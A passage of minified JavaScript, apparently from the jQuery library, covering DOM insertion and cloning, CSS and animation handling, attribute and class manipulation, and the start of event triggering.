/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi, Ae = /<script|<style|<link/i, je = /checked\s*(?:[^=]|=\s*.checked.)/i, qe = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g; function Le(e, t) { return N(e, "table") && N(11 !== t.nodeType ? t : t.firstChild, "tr") ? w(e).children("tbody")[0] || e : e } function He(e) { return e.type = (null !== e.getAttribute("type")) + "/" + e.type, e } function Oe(e) { return "true/" === (e.type || "").slice(0, 5) ? e.type = e.type.slice(5) : e.removeAttribute("type"), e } function Pe(e, t) { var n, r, i, o, a, s, u, l; if (1 === t.nodeType) { if (J.hasData(e) && (o = J.access(e), a = J.set(t, o), l = o.events)) { delete a.handle, a.events = {}; for (i in l) for (n = 0, r = l[i].length; n < r; n++)w.event.add(t, i, l[i][n]) } K.hasData(e) && (s = K.access(e), u = w.extend({}, s), K.set(t, u)) } } function Me(e, t) { var n = t.nodeName.toLowerCase(); "input" === n && pe.test(e.type) ? t.checked = e.checked : "input" !== n && "textarea" !== n || (t.defaultValue = e.defaultValue) } function Re(e, t, n, r) { t = a.apply([], t); var i, o, s, u, l, c, f = 0, p = e.length, d = p - 1, y = t[0], v = g(y); if (v || p > 1 && "string" == typeof y && !h.checkClone && je.test(y)) return e.each(function (i) { var o = e.eq(i); v && (t[0] = y.call(this, i, o.html())), Re(o, t, n, r) }); if (p && (i = xe(t, e[0].ownerDocument, !1, e, r), o = i.firstChild, 1 === i.childNodes.length && (i = o), o || r)) { for (u = (s = w.map(ye(i, "script"), He)).length; f < p; f++)l = i, f !== d && (l = w.clone(l, !0, !0), u && w.merge(s, ye(l, "script"))), n.call(e[f], l, f); if (u) for (c = s[s.length - 1].ownerDocument, w.map(s, Oe), f = 0; f < u; f++)l = s[f], he.test(l.type || "") && !J.access(l, "globalEval") && w.contains(c, l) && (l.src && "module" !== (l.type || "").toLowerCase() ? w._evalUrl && w._evalUrl(l.src) : m(l.textContent.replace(qe, ""), c, l)) } return e } function Ie(e, t, n) { for (var r, i = t ? w.filter(t, e) : e, o = 0; null != (r = i[o]); o++)n || 1 !== r.nodeType || w.cleanData(ye(r)), r.parentNode && (n && w.contains(r.ownerDocument, r) && ve(ye(r, "script")), r.parentNode.removeChild(r)); return e } w.extend({ htmlPrefilter: function (e) { return e.replace(Ne, "<$1></$2>") }, clone: function (e, t, n) { var r, i, o, a, s = e.cloneNode(!0), u = w.contains(e.ownerDocument, e); if (!(h.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || w.isXMLDoc(e))) for (a = ye(s), r = 0, i = (o = ye(e)).length; r < i; r++)Me(o[r], a[r]); if (t) if (n) for (o = o || ye(e), a = a || ye(s), r = 0, i = o.length; r < i; r++)Pe(o[r], a[r]); else Pe(e, s); return (a = ye(s, "script")).length > 0 && ve(a, !u && ye(e, "script")), s }, cleanData: function (e) { for (var t, n, r, i = w.event.special, o = 0; void 0 !== (n = e[o]); o++)if (Y(n)) { if (t = n[J.expando]) { if (t.events) for (r in t.events) i[r] ? w.event.remove(n, r) : w.removeEvent(n, r, t.handle); n[J.expando] = void 0 } n[K.expando] && (n[K.expando] = void 0) } } }), w.fn.extend({ detach: function (e) { return Ie(this, e, !0) }, remove: function (e) { return Ie(this, e) }, text: function (e) { return z(this, function (e) { return void 0 === e ? w.text(this) : this.empty().each(function () { 1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || (this.textContent = e) }) }, null, e, arguments.length) }, append: function () { return Re(this, arguments, function (e) { 1 !== this.nodeType && 11 !== this.nodeType && 9 !== this.nodeType || Le(this, e).appendChild(e) }) }, prepend: function () { return Re(this, arguments, function (e) { if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) { var t = Le(this, e); t.insertBefore(e, t.firstChild) } }) }, before: function () { return Re(this, arguments, function (e) { this.parentNode && this.parentNode.insertBefore(e, this) }) }, after: function () { return Re(this, arguments, function (e) { this.parentNode && this.parentNode.insertBefore(e, this.nextSibling) }) }, empty: function () { for (var e, t = 0; null != (e = this[t]); t++)1 === e.nodeType && (w.cleanData(ye(e, !1)), e.textContent = ""); return this }, clone: function (e, t) { return e = null != e && e, t = null == t ? e : t, this.map(function () { return w.clone(this, e, t) }) }, html: function (e) { return z(this, function (e) { var t = this[0] || {}, n = 0, r = this.length; if (void 0 === e && 1 === t.nodeType) return t.innerHTML; if ("string" == typeof e && !Ae.test(e) && !ge[(de.exec(e) || ["", ""])[1].toLowerCase()]) { e = w.htmlPrefilter(e); try { for (; n < r; n++)1 === (t = this[n] || {}).nodeType && (w.cleanData(ye(t, !1)), t.innerHTML = e); t = 0 } catch (e) { } } t && this.empty().append(e) }, null, e, arguments.length) }, replaceWith: function () { var e = []; return Re(this, arguments, function (t) { var n = this.parentNode; w.inArray(this, e) < 0 && (w.cleanData(ye(this)), n && n.replaceChild(t, this)) }, e) } }), w.each({ appendTo: "append", prependTo: "prepend", insertBefore: "before", insertAfter: "after", replaceAll: "replaceWith" }, function (e, t) { w.fn[e] = function (e) { for (var n, r = [], i = w(e), o = i.length - 1, a = 0; a <= o; a++)n = a === o ? this : this.clone(!0), w(i[a])[t](n), s.apply(r, n.get()); return this.pushStack(r) } }); var We = new RegExp("^(" + re + ")(?!px)[a-z%]+$", "i"), $e = function (t) { var n = t.ownerDocument.defaultView; return n && n.opener || (n = e), n.getComputedStyle(t) }, Be = new RegExp(oe.join("|"), "i"); !function () { function t() { if (c) { l.style.cssText = "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0", c.style.cssText = "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%", be.appendChild(l).appendChild(c); var t = e.getComputedStyle(c); i = "1%" !== t.top, u = 12 === n(t.marginLeft), c.style.right = "60%", s = 36 === n(t.right), o = 36 === n(t.width), c.style.position = "absolute", a = 36 === c.offsetWidth || "absolute", be.removeChild(l), c = null } } function n(e) { return Math.round(parseFloat(e)) } var i, o, a, s, u, l = r.createElement("div"), c = r.createElement("div"); c.style && (c.style.backgroundClip = "content-box", c.cloneNode(!0).style.backgroundClip = "", h.clearCloneStyle = "content-box" === c.style.backgroundClip, w.extend(h, { boxSizingReliable: function () { return t(), o }, pixelBoxStyles: function () { return t(), s }, pixelPosition: function () { return t(), i }, reliableMarginLeft: function () { return t(), u }, scrollboxSize: function () { return t(), a } })) }(); function Fe(e, t, n) { var r, i, o, a, s = e.style; return (n = n || $e(e)) && ("" !== (a = n.getPropertyValue(t) || n[t]) || w.contains(e.ownerDocument, e) || (a = w.style(e, t)), !h.pixelBoxStyles() && We.test(a) && Be.test(t) && (r = s.width, i = s.minWidth, o = s.maxWidth, s.minWidth = s.maxWidth = s.width = a, a = n.width, s.width = r, s.minWidth = i, s.maxWidth = o)), void 0 !== a ? a + "" : a } function _e(e, t) { return { get: function () { if (!e()) return (this.get = t).apply(this, arguments); delete this.get } } } var ze = /^(none|table(?!-c[ea]).+)/, Xe = /^--/, Ue = { position: "absolute", visibility: "hidden", display: "block" }, Ve = { letterSpacing: "0", fontWeight: "400" }, Ge = ["Webkit", "Moz", "ms"], Ye = r.createElement("div").style; function Qe(e) { if (e in Ye) return e; var t = e[0].toUpperCase() + e.slice(1), n = Ge.length; while (n--) if ((e = Ge[n] + t) in Ye) return e } function Je(e) { var t = w.cssProps[e]; return t || (t = w.cssProps[e] = Qe(e) || e), t } function Ke(e, t, n) { var r = ie.exec(t); return r ? Math.max(0, r[2] - (n || 0)) + (r[3] || "px") : t } function Ze(e, t, n, r, i, o) { var a = "width" === t ? 1 : 0, s = 0, u = 0; if (n === (r ? "border" : "content")) return 0; for (; a < 4; a += 2)"margin" === n && (u += w.css(e, n + oe[a], !0, i)), r ? ("content" === n && (u -= w.css(e, "padding" + oe[a], !0, i)), "margin" !== n && (u -= w.css(e, "border" + oe[a] + "Width", !0, i))) : (u += w.css(e, "padding" + oe[a], !0, i), "padding" !== n ? u += w.css(e, "border" + oe[a] + "Width", !0, i) : s += w.css(e, "border" + oe[a] + "Width", !0, i)); return !r && o >= 0 && (u += Math.max(0, Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - o - u - s - .5))), u } function et(e, t, n) { var r = $e(e), i = Fe(e, t, r), o = "border-box" === w.css(e, "boxSizing", !1, r), a = o; if (We.test(i)) { if (!n) return i; i = "auto" } return a = a && (h.boxSizingReliable() || i === e.style[t]), ("auto" === i || !parseFloat(i) && "inline" === w.css(e, "display", !1, r)) && (i = e["offset" + t[0].toUpperCase() + t.slice(1)], a = !0), (i = parseFloat(i) || 0) + Ze(e, t, n || (o ? "border" : "content"), a, r, i) + "px" } w.extend({ cssHooks: { opacity: { get: function (e, t) { if (t) { var n = Fe(e, "opacity"); return "" === n ? "1" : n } } } }, cssNumber: { animationIterationCount: !0, columnCount: !0, fillOpacity: !0, flexGrow: !0, flexShrink: !0, fontWeight: !0, lineHeight: !0, opacity: !0, order: !0, orphans: !0, widows: !0, zIndex: !0, zoom: !0 }, cssProps: {}, style: function (e, t, n, r) { if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) { var i, o, a, s = G(t), u = Xe.test(t), l = e.style; if (u || (t = Je(s)), a = w.cssHooks[t] || w.cssHooks[s], void 0 === n) return a && "get" in a && void 0 !== (i = a.get(e, !1, r)) ? i : l[t]; "string" == (o = typeof n) && (i = ie.exec(n)) && i[1] && (n = ue(e, t, i), o = "number"), null != n && n === n && ("number" === o && (n += i && i[3] || (w.cssNumber[s] ? "" : "px")), h.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (l[t] = "inherit"), a && "set" in a && void 0 === (n = a.set(e, n, r)) || (u ? l.setProperty(t, n) : l[t] = n)) } }, css: function (e, t, n, r) { var i, o, a, s = G(t); return Xe.test(t) || (t = Je(s)), (a = w.cssHooks[t] || w.cssHooks[s]) && "get" in a && (i = a.get(e, !0, n)), void 0 === i && (i = Fe(e, t, r)), "normal" === i && t in Ve && (i = Ve[t]), "" === n || n ? (o = parseFloat(i), !0 === n || isFinite(o) ? o || 0 : i) : i } }), w.each(["height", "width"], function (e, t) { w.cssHooks[t] = { get: function (e, n, r) { if (n) return !ze.test(w.css(e, "display")) || e.getClientRects().length && e.getBoundingClientRect().width ? et(e, t, r) : se(e, Ue, function () { return et(e, t, r) }) }, set: function (e, n, r) { var i, o = $e(e), a = "border-box" === w.css(e, "boxSizing", !1, o), s = r && Ze(e, t, r, a, o); return a && h.scrollboxSize() === o.position && (s -= Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - parseFloat(o[t]) - Ze(e, t, "border", !1, o) - .5)), s && (i = ie.exec(n)) && "px" !== (i[3] || "px") && (e.style[t] = n, n = w.css(e, t)), Ke(e, n, s) } } }), w.cssHooks.marginLeft = _e(h.reliableMarginLeft, function (e, t) { if (t) return (parseFloat(Fe(e, "marginLeft")) || e.getBoundingClientRect().left - se(e, { marginLeft: 0 }, function () { return e.getBoundingClientRect().left })) + "px" }), w.each({ margin: "", padding: "", border: "Width" }, function (e, t) { w.cssHooks[e + t] = { expand: function (n) { for (var r = 0, i = {}, o = "string" == typeof n ? n.split(" ") : [n]; r < 4; r++)i[e + oe[r] + t] = o[r] || o[r - 2] || o[0]; return i } }, "margin" !== e && (w.cssHooks[e + t].set = Ke) }), w.fn.extend({ css: function (e, t) { return z(this, function (e, t, n) { var r, i, o = {}, a = 0; if (Array.isArray(t)) { for (r = $e(e), i = t.length; a < i; a++)o[t[a]] = w.css(e, t[a], !1, r); return o } return void 0 !== n ? w.style(e, t, n) : w.css(e, t) }, e, t, arguments.length > 1) } }); function tt(e, t, n, r, i) { return new tt.prototype.init(e, t, n, r, i) } w.Tween = tt, tt.prototype = { constructor: tt, init: function (e, t, n, r, i, o) { this.elem = e, this.prop = n, this.easing = i || w.easing._default, this.options = t, this.start = this.now = this.cur(), this.end = r, this.unit = o || (w.cssNumber[n] ? "" : "px") }, cur: function () { var e = tt.propHooks[this.prop]; return e && e.get ? e.get(this) : tt.propHooks._default.get(this) }, run: function (e) { var t, n = tt.propHooks[this.prop]; return this.options.duration ? this.pos = t = w.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = t = e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : tt.propHooks._default.set(this), this } }, tt.prototype.init.prototype = tt.prototype, tt.propHooks = { _default: { get: function (e) { var t; return 1 !== e.elem.nodeType || null != e.elem[e.prop] && null == e.elem.style[e.prop] ? e.elem[e.prop] : (t = w.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0 }, set: function (e) { w.fx.step[e.prop] ? w.fx.step[e.prop](e) : 1 !== e.elem.nodeType || null == e.elem.style[w.cssProps[e.prop]] && !w.cssHooks[e.prop] ? e.elem[e.prop] = e.now : w.style(e.elem, e.prop, e.now + e.unit) } } }, tt.propHooks.scrollTop = tt.propHooks.scrollLeft = { set: function (e) { e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now) } }, w.easing = { linear: function (e) { return e }, swing: function (e) { return .5 - Math.cos(e * Math.PI) / 2 }, _default: "swing" }, w.fx = tt.prototype.init, w.fx.step = {}; var nt, rt, it = /^(?:toggle|show|hide)$/, ot = /queueHooks$/; function at() { rt && (!1 === r.hidden && e.requestAnimationFrame ? e.requestAnimationFrame(at) : e.setTimeout(at, w.fx.interval), w.fx.tick()) } function st() { return e.setTimeout(function () { nt = void 0 }), nt = Date.now() } function ut(e, t) { var n, r = 0, i = { height: e }; for (t = t ? 1 : 0; r < 4; r += 2 - t)i["margin" + (n = oe[r])] = i["padding" + n] = e; return t && (i.opacity = i.width = e), i } function lt(e, t, n) { for (var r, i = (pt.tweeners[t] || []).concat(pt.tweeners["*"]), o = 0, a = i.length; o < a; o++)if (r = i[o].call(n, t, e)) return r } function ct(e, t, n) { var r, i, o, a, s, u, l, c, f = "width" in t || "height" in t, p = this, d = {}, h = e.style, g = e.nodeType && ae(e), y = J.get(e, "fxshow"); n.queue || (null == (a = w._queueHooks(e, "fx")).unqueued && (a.unqueued = 0, s = a.empty.fire, a.empty.fire = function () { a.unqueued || s() }), a.unqueued++, p.always(function () { p.always(function () { a.unqueued--, w.queue(e, "fx").length || a.empty.fire() }) })); for (r in t) if (i = t[r], it.test(i)) { if (delete t[r], o = o || "toggle" === i, i === (g ? "hide" : "show")) { if ("show" !== i || !y || void 0 === y[r]) continue; g = !0 } d[r] = y && y[r] || w.style(e, r) } if ((u = !w.isEmptyObject(t)) || !w.isEmptyObject(d)) { f && 1 === e.nodeType && (n.overflow = [h.overflow, h.overflowX, h.overflowY], null == (l = y && y.display) && (l = J.get(e, "display")), "none" === (c = w.css(e, "display")) && (l ? c = l : (fe([e], !0), l = e.style.display || l, c = w.css(e, "display"), fe([e]))), ("inline" === c || "inline-block" === c && null != l) && "none" === w.css(e, "float") && (u || (p.done(function () { h.display = l }), null == l && (c = h.display, l = "none" === c ? "" : c)), h.display = "inline-block")), n.overflow && (h.overflow = "hidden", p.always(function () { h.overflow = n.overflow[0], h.overflowX = n.overflow[1], h.overflowY = n.overflow[2] })), u = !1; for (r in d) u || (y ? "hidden" in y && (g = y.hidden) : y = J.access(e, "fxshow", { display: l }), o && (y.hidden = !g), g && fe([e], !0), p.done(function () { g || fe([e]), J.remove(e, "fxshow"); for (r in d) w.style(e, r, d[r]) })), u = lt(g ? y[r] : 0, r, p), r in y || (y[r] = u.start, g && (u.end = u.start, u.start = 0)) } } function ft(e, t) { var n, r, i, o, a; for (n in e) if (r = G(n), i = t[r], o = e[n], Array.isArray(o) && (i = o[1], o = e[n] = o[0]), n !== r && (e[r] = o, delete e[n]), (a = w.cssHooks[r]) && "expand" in a) { o = a.expand(o), delete e[r]; for (n in o) n in e || (e[n] = o[n], t[n] = i) } else t[r] = i } function pt(e, t, n) { var r, i, o = 0, a = pt.prefilters.length, s = w.Deferred().always(function () { delete u.elem }), u = function () { if (i) return !1; for (var t = nt || st(), n = Math.max(0, l.startTime + l.duration - t), r = 1 - (n / l.duration || 0), o = 0, a = l.tweens.length; o < a; o++)l.tweens[o].run(r); return s.notifyWith(e, [l, r, n]), r < 1 && a ? n : (a || s.notifyWith(e, [l, 1, 0]), s.resolveWith(e, [l]), !1) }, l = s.promise({ elem: e, props: w.extend({}, t), opts: w.extend(!0, { specialEasing: {}, easing: w.easing._default }, n), originalProperties: t, originalOptions: n, startTime: nt || st(), duration: n.duration, tweens: [], createTween: function (t, n) { var r = w.Tween(e, l.opts, t, n, l.opts.specialEasing[t] || l.opts.easing); return l.tweens.push(r), r }, stop: function (t) { var n = 0, r = t ? l.tweens.length : 0; if (i) return this; for (i = !0; n < r; n++)l.tweens[n].run(1); return t ? (s.notifyWith(e, [l, 1, 0]), s.resolveWith(e, [l, t])) : s.rejectWith(e, [l, t]), this } }), c = l.props; for (ft(c, l.opts.specialEasing); o < a; o++)if (r = pt.prefilters[o].call(l, e, c, l.opts)) return g(r.stop) && (w._queueHooks(l.elem, l.opts.queue).stop = r.stop.bind(r)), r; return w.map(c, lt, l), g(l.opts.start) && l.opts.start.call(e, l), l.progress(l.opts.progress).done(l.opts.done, l.opts.complete).fail(l.opts.fail).always(l.opts.always), w.fx.timer(w.extend(u, { elem: e, anim: l, queue: l.opts.queue })), l } w.Animation = w.extend(pt, { tweeners: { "*": [function (e, t) { var n = this.createTween(e, t); return ue(n.elem, e, ie.exec(t), n), n }] }, tweener: function (e, t) { g(e) ? (t = e, e = ["*"]) : e = e.match(M); for (var n, r = 0, i = e.length; r < i; r++)n = e[r], pt.tweeners[n] = pt.tweeners[n] || [], pt.tweeners[n].unshift(t) }, prefilters: [ct], prefilter: function (e, t) { t ? pt.prefilters.unshift(e) : pt.prefilters.push(e) } }), w.speed = function (e, t, n) { var r = e && "object" == typeof e ? w.extend({}, e) : { complete: n || !n && t || g(e) && e, duration: e, easing: n && t || t && !g(t) && t }; return w.fx.off ? r.duration = 0 : "number" != typeof r.duration && (r.duration in w.fx.speeds ? r.duration = w.fx.speeds[r.duration] : r.duration = w.fx.speeds._default), null != r.queue && !0 !== r.queue || (r.queue = "fx"), r.old = r.complete, r.complete = function () { g(r.old) && r.old.call(this), r.queue && w.dequeue(this, r.queue) }, r }, w.fn.extend({ fadeTo: function (e, t, n, r) { return this.filter(ae).css("opacity", 0).show().end().animate({ opacity: t }, e, n, r) }, animate: function (e, t, n, r) { var i = w.isEmptyObject(e), o = w.speed(t, n, r), a = function () { var t = pt(this, w.extend({}, e), o); (i || J.get(this, "finish")) && t.stop(!0) }; return a.finish = a, i || !1 === o.queue ? this.each(a) : this.queue(o.queue, a) }, stop: function (e, t, n) { var r = function (e) { var t = e.stop; delete e.stop, t(n) }; return "string" != typeof e && (n = t, t = e, e = void 0), t && !1 !== e && this.queue(e || "fx", []), this.each(function () { var t = !0, i = null != e && e + "queueHooks", o = w.timers, a = J.get(this); if (i) a[i] && a[i].stop && r(a[i]); else for (i in a) a[i] && a[i].stop && ot.test(i) && r(a[i]); for (i = o.length; i--;)o[i].elem !== this || null != e && o[i].queue !== e || (o[i].anim.stop(n), t = !1, o.splice(i, 1)); !t && n || w.dequeue(this, e) }) }, finish: function (e) { return !1 !== e && (e = e || "fx"), this.each(function () { var t, n = J.get(this), r = n[e + "queue"], i = n[e + "queueHooks"], o = w.timers, a = r ? r.length : 0; for (n.finish = !0, w.queue(this, e, []), i && i.stop && i.stop.call(this, !0), t = o.length; t--;)o[t].elem === this && o[t].queue === e && (o[t].anim.stop(!0), o.splice(t, 1)); for (t = 0; t < a; t++)r[t] && r[t].finish && r[t].finish.call(this); delete n.finish }) } }), w.each(["toggle", "show", "hide"], function (e, t) { var n = w.fn[t]; w.fn[t] = function (e, r, i) { return null == e || "boolean" == typeof e ? n.apply(this, arguments) : this.animate(ut(t, !0), e, r, i) } }), w.each({ slideDown: ut("show"), slideUp: ut("hide"), slideToggle: ut("toggle"), fadeIn: { opacity: "show" }, fadeOut: { opacity: "hide" }, fadeToggle: { opacity: "toggle" } }, function (e, t) { w.fn[e] = function (e, n, r) { return this.animate(t, e, n, r) } }), w.timers = [], w.fx.tick = function () { var e, t = 0, n = w.timers; for (nt = Date.now(); t < n.length; t++)(e = n[t])() || n[t] !== e || n.splice(t--, 1); n.length || w.fx.stop(), nt = void 0 }, w.fx.timer = function (e) { w.timers.push(e), w.fx.start() }, w.fx.interval = 13, w.fx.start = function () { rt || (rt = !0, at()) }, w.fx.stop = function () { rt = null }, w.fx.speeds = { slow: 600, fast: 200, _default: 400 }, w.fn.delay = function (t, n) { return t = w.fx ? w.fx.speeds[t] || t : t, n = n || "fx", this.queue(n, function (n, r) { var i = e.setTimeout(n, t); r.stop = function () { e.clearTimeout(i) } }) }, function () { var e = r.createElement("input"), t = r.createElement("select").appendChild(r.createElement("option")); e.type = "checkbox", h.checkOn = "" !== e.value, h.optSelected = t.selected, (e = r.createElement("input")).value = "t", e.type = "radio", h.radioValue = "t" === e.value }(); var dt, ht = w.expr.attrHandle; w.fn.extend({ attr: function (e, t) { return z(this, w.attr, e, t, arguments.length > 1) }, removeAttr: function (e) { return this.each(function () { w.removeAttr(this, e) }) } }), w.extend({ attr: function (e, t, n) { var r, i, o = e.nodeType; if (3 !== o && 8 !== o && 2 !== o) return "undefined" == typeof e.getAttribute ? w.prop(e, t, n) : (1 === o && w.isXMLDoc(e) || (i = w.attrHooks[t.toLowerCase()] || (w.expr.match.bool.test(t) ? dt : void 0)), void 0 !== n ? null === n ? void w.removeAttr(e, t) : i && "set" in i && void 0 !== (r = i.set(e, n, t)) ? r : (e.setAttribute(t, n + ""), n) : i && "get" in i && null !== (r = i.get(e, t)) ? r : null == (r = w.find.attr(e, t)) ? void 0 : r) }, attrHooks: { type: { set: function (e, t) { if (!h.radioValue && "radio" === t && N(e, "input")) { var n = e.value; return e.setAttribute("type", t), n && (e.value = n), t } } } }, removeAttr: function (e, t) { var n, r = 0, i = t && t.match(M); if (i && 1 === e.nodeType) while (n = i[r++]) e.removeAttribute(n) } }), dt = { set: function (e, t, n) { return !1 === t ? w.removeAttr(e, n) : e.setAttribute(n, n), n } }, w.each(w.expr.match.bool.source.match(/\w+/g), function (e, t) { var n = ht[t] || w.find.attr; ht[t] = function (e, t, r) { var i, o, a = t.toLowerCase(); return r || (o = ht[a], ht[a] = i, i = null != n(e, t, r) ? a : null, ht[a] = o), i } }); var gt = /^(?:input|select|textarea|button)$/i, yt = /^(?:a|area)$/i; w.fn.extend({ prop: function (e, t) { return z(this, w.prop, e, t, arguments.length > 1) }, removeProp: function (e) { return this.each(function () { delete this[w.propFix[e] || e] }) } }), w.extend({ prop: function (e, t, n) { var r, i, o = e.nodeType; if (3 !== o && 8 !== o && 2 !== o) return 1 === o && w.isXMLDoc(e) || (t = w.propFix[t] || t, i = w.propHooks[t]), void 0 !== n ? i && "set" in i && void 0 !== (r = i.set(e, n, t)) ? r : e[t] = n : i && "get" in i && null !== (r = i.get(e, t)) ? r : e[t] }, propHooks: { tabIndex: { get: function (e) { var t = w.find.attr(e, "tabindex"); return t ? parseInt(t, 10) : gt.test(e.nodeName) || yt.test(e.nodeName) && e.href ? 0 : -1 } } }, propFix: { "for": "htmlFor", "class": "className" } }), h.optSelected || (w.propHooks.selected = { get: function (e) { var t = e.parentNode; return t && t.parentNode && t.parentNode.selectedIndex, null }, set: function (e) { var t = e.parentNode; t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex) } }), w.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function () { w.propFix[this.toLowerCase()] = this }); function vt(e) { return (e.match(M) || []).join(" ") } function mt(e) { return e.getAttribute && e.getAttribute("class") || "" } function xt(e) { return Array.isArray(e) ? e : "string" == typeof e ? e.match(M) || [] : [] } w.fn.extend({ addClass: function (e) { var t, n, r, i, o, a, s, u = 0; if (g(e)) return this.each(function (t) { w(this).addClass(e.call(this, t, mt(this))) }); if ((t = xt(e)).length) while (n = this[u++]) if (i = mt(n), r = 1 === n.nodeType && " " + vt(i) + " ") { a = 0; while (o = t[a++]) r.indexOf(" " + o + " ") < 0 && (r += o + " "); i !== (s = vt(r)) && n.setAttribute("class", s) } return this }, removeClass: function (e) { var t, n, r, i, o, a, s, u = 0; if (g(e)) return this.each(function (t) { w(this).removeClass(e.call(this, t, mt(this))) }); if (!arguments.length) return this.attr("class", ""); if ((t = xt(e)).length) while (n = this[u++]) if (i = mt(n), r = 1 === n.nodeType && " " + vt(i) + " ") { a = 0; while (o = t[a++]) while (r.indexOf(" " + o + " ") > -1) r = r.replace(" " + o + " ", " "); i !== (s = vt(r)) && n.setAttribute("class", s) } return this }, toggleClass: function (e, t) { var n = typeof e, r = "string" === n || Array.isArray(e); return "boolean" == typeof t && r ? t ? this.addClass(e) : this.removeClass(e) : g(e) ? this.each(function (n) { w(this).toggleClass(e.call(this, n, mt(this), t), t) }) : this.each(function () { var t, i, o, a; if (r) { i = 0, o = w(this), a = xt(e); while (t = a[i++]) o.hasClass(t) ? o.removeClass(t) : o.addClass(t) } else void 0 !== e && "boolean" !== n || ((t = mt(this)) && J.set(this, "__className__", t), this.setAttribute && this.setAttribute("class", t || !1 === e ? "" : J.get(this, "__className__") || "")) }) }, hasClass: function (e) { var t, n, r = 0; t = " " + e + " "; while (n = this[r++]) if (1 === n.nodeType && (" " + vt(mt(n)) + " ").indexOf(t) > -1) return !0; return !1 } }); var bt = /\r/g; w.fn.extend({ val: function (e) { var t, n, r, i = this[0]; { if (arguments.length) return r = g(e), this.each(function (n) { var i; 1 === this.nodeType && (null == (i = r ? e.call(this, n, w(this).val()) : e) ? i = "" : "number" == typeof i ? i += "" : Array.isArray(i) && (i = w.map(i, function (e) { return null == e ? "" : e + "" })), (t = w.valHooks[this.type] || w.valHooks[this.nodeName.toLowerCase()]) && "set" in t && void 0 !== t.set(this, i, "value") || (this.value = i)) }); if (i) return (t = w.valHooks[i.type] || w.valHooks[i.nodeName.toLowerCase()]) && "get" in t && void 0 !== (n = t.get(i, "value")) ? n : "string" == typeof (n = i.value) ? n.replace(bt, "") : null == n ? "" : n } } }), w.extend({ valHooks: { option: { get: function (e) { var t = w.find.attr(e, "value"); return null != t ? t : vt(w.text(e)) } }, select: { get: function (e) { var t, n, r, i = e.options, o = e.selectedIndex, a = "select-one" === e.type, s = a ? null : [], u = a ? o + 1 : i.length; for (r = o < 0 ? u : a ? o : 0; r < u; r++)if (((n = i[r]).selected || r === o) && !n.disabled && (!n.parentNode.disabled || !N(n.parentNode, "optgroup"))) { if (t = w(n).val(), a) return t; s.push(t) } return s }, set: function (e, t) { var n, r, i = e.options, o = w.makeArray(t), a = i.length; while (a--) ((r = i[a]).selected = w.inArray(w.valHooks.option.get(r), o) > -1) && (n = !0); return n || (e.selectedIndex = -1), o } } } }), w.each(["radio", "checkbox"], function () { w.valHooks[this] = { set: function (e, t) { if (Array.isArray(t)) return e.checked = w.inArray(w(e).val(), t) > -1 } }, h.checkOn || (w.valHooks[this].get = function (e) { return null === e.getAttribute("value") ? "on" : e.value }) }), h.focusin = "onfocusin" in e; var wt = /^(?:focusinfocus|focusoutblur)$/, Tt = function (e) { e.stopPropagation() }; w.extend(w.event, { trigger: function (t, n, i, o) { var a, s, u, l, c, p, d, h, v = [i || r], m = f.call(t, "type") ? t.type : t, x = f.call(t, "namespace") ? t.namespace.split(".") : []; if (s = h = u = i = i || r, 3 !== i.nodeType && 8 !== i.nodeType && !wt.test(m + w.event.triggered) && (m.indexOf(".") > -1 && (m = (x = m.split(".")).shift(), x.sort()), c = m.indexOf(":") < 0 && "on" + m, t = t[w.expando] ? t : new w.Event(m, "object" == typeof t && t), t.isTrigger = o ? 2 : 3, t.namespace = x.join("."), t.rnamespace = t.namespace ? new RegExp("(^|\\.)" + x.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, t.result = void 0, t.target || (t.target = i), n = null == n ? [t] : w.makeArray(n, [t]), d = w.event.special[m] || {}, o || !d.trigger || !1 !== d.trigger.apply(i, n))) { if (!o && !d.noBubble && !y(i)) { for (l = d.delegateType || m, wt.test(l + m) || (s = s.parentNode); s; s = s.parentNode)v.push(s), u = s; u === (i.ownerDocument || r) && v.push(u.defaultView || u.parentWindow || e) } a = 0; while ((s = v[a++]) && !t.isPropagationStopped()) h = s, t.type = a > 1 ? l : d.bindType || m, (p = (J.get(s, "events") || {})[t.type] && J.get(s, "handle")) && p.apply(s, n), (p = c && s[c]) && p.apply && Y(s) && (t.result = p.apply(s, n), !1 === t.result && t.preventDefault()); return t.type = m, o || t.isDefaultPrevented() || d._default && !1 !== d._default.apply(v.pop(), n) || !Y(i) || c && g(i[m]) && !y(i) && ((u = i[c]) && (i[c] = null), w.event.triggered = m, t.isPropagationStopped() && h.addEventListener(m, Tt), i[m](), t.isPropagationStopped() && h.removeEventListener(m, Tt), w.event.triggered = void 0, u && (i[c] = u)), t.result } }, simulate: function (e, t, n) { var r = w.extend(new w.Event, n, { type: e, isSimulated: !0 }); w.event.trigger(r, null, t) } }), w.fn.extend({ trigger: function (e, t) { return this.each(function () { w.event.trigger(e, t, this) }) }, triggerHandler: function (e, t) { var n = this[0]; if (n) return w.event.trigger(e, t, n, !0) } }), h.focusin || w.each({ focus: "focusin", blur: "focusout" }, function (e, t) { var n = function (e) { w.event.simulate(t, e.target, w.event.fix(e)) }; w.event.special[t] = { setup: function () { var r = this.ownerDocument || this, i = J.access(r, t); i || r.addEventListener(e, n, !0), J.access(r, t, (i || 0) + 1) }, teardown: function () { var r = this.ownerDocument || this, i = 